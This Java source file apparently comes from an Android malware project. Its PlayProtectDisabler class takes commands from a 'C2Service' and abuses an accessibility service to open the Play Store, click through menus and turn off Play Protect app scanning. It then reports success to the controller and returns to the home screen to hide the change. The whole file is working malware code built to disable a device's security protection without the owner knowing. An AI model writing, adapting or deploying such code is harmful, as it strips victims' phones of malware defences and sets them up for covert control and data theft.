package com.wuzenx.engine;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import com.wuzenx.C2Service;
import com.wuzenx.services.WuzenAccessibilityService;

public class PlayProtectDisabler {
    private C2Service c2;
    private boolean active = false;
    private int step = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String playStorePkg = "com.android.vending";

    public PlayProtectDisabler(C2Service c2) { this.c2 = c2; }

    public void start() {
        active = true; step = 0;
        c2.sendMessage("log", "Disabling Play Protect...");
        try {
            Intent intent = c2.getPackageManager().getLaunchIntentForPackage(playStorePkg);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                c2.startActivity(intent);
            }
            handler.postDelayed(() -> step1(), 3000);
        } catch (Exception e) { c2.sendMessage("log", "PP Error: " + e.getMessage()); }
    }

    public void stop() { active = false; handler.removeCallbacksAndMessages(null); step = 0; }

    private void step1() { click("account", "profile", "menu", "hamburger"); step++; handler.postDelayed(() -> step2(), 2000); }
    private void step2() { click("play protect", "playprotect", "security"); step++; handler.postDelayed(() -> step3(), 2000); }
    private void step3() { clickDesc("settings", "gear", "more", "menu"); step++; handler.postDelayed(() -> step4(), 2000); }
    private void step4() {
        clickDesc("scan apps", "toggle", "switch", "checkbox");
        step++;
        handler.postDelayed(() -> {
            click("turn off", "disable", "ok", "confirm");
            c2.sendMessage("log", "Play Protect disabled ✅");
            WuzenAccessibilityService.instance.performGlobalAction(
                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
            stop();
        }, 1500);
    }

    private void click(String... texts) {
        AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
            WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
        if (root != null) { findText(root, texts); root.recycle(); }
    }

    private void clickDesc(String... descs) {
        AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
            WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
        if (root != null) { findDesc(root, descs); root.recycle(); }
    }

    private void findText(AccessibilityNodeInfo node, String... texts) {
        if (node == null) return;
        String t = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        for (String s : texts) { if (t.contains(s) && node.isClickable()) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; } }
        for (int i = 0; i < node.getChildCount(); i++) { try { AccessibilityNodeInfo c = node.getChild(i); if (c != null) { findText(c, texts); } } catch (Exception ignored) {} }
    }

    private void findDesc(AccessibilityNodeInfo node, String... descs) {
        if (node == null) return;
        String d = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
        String v = node.getViewIdResourceName() != null ? node.getViewIdResourceName().toLowerCase() : "";
        String t = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        for (String s : descs) { if (d.contains(s) || v.contains(s) || t.contains(s)) { if (node.isClickable()) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; } } }
        for (int i = 0; i < node.getChildCount(); i++) { try { AccessibilityNodeInfo c = node.getChild(i); if (c != null) { findDesc(c, descs); } } catch (Exception ignored) {} }
    }
}
